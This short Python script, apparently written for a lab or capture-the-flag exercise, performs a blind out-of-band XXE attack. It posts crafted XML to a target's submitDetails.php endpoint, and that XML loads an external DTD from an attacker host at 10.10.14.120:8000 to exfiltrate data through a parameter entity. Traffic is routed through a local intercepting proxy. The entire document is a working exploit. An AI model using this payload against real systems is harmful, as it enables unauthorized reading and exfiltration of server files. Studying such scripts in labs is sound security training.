import requests
import sys
from rich import print
import re
import base64

requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'
}

url = f"{sys.argv[1]}/blind/submitDetails.php"

xml = """<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE email [ 
  	<!ENTITY % remote SYSTEM "http://10.10.14.120:8000/xxe3_blind.dtd">
  	%remote;
  	%oob;
	]>
	<root>
	 <name>aaa</name>
	 <tel>7777777</tel>
	 <email>&content;</email>
	 <message>aaaaaaaaaa</message>
	</root>
"""

response = requests.post(url, data=xml, headers=headers, proxies=proxies)

